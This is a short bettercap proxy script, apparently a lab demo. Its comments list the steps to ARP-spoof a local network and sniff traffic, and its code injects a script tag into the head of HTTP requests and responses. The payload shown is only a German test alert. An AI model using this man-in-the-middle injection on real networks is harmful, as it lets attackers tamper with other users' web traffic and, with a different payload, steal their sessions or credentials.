// sudo bettercap -iface pi1eth0


// Step 1 activate bettercap
// Step 2 activate net.probe
// Step 3 activate arp.spoof
// Step 4 set http.proxy.injectjs /Pfad/http.js
// Step 5 activate the http.proxy
// Step 6 activate net.sniff

// Define the JavaScript to be injected
var customJavaScript = '<script>alert("Dies ist eine Testmeldung.");</script>';

// Function called when the request is received by the proxy
// and before it is sent to the real server.
function onRequest(req, res) {
    // Modify the request headers, if necessary
    req.headers['User-Agent'] = 'CustomUserAgent';

    // Modify the request body, if necessary
    req.body = req.body.replace('</head>', customJavaScript + '</head>');

    return req;
}

// Function called when the request is sent to the real server
// and a response is received
function onResponse(req, res) {
    // Modify the response body, if necessary
    res.body = res.body.replace('</head>', customJavaScript + '</head>');

    return res;
}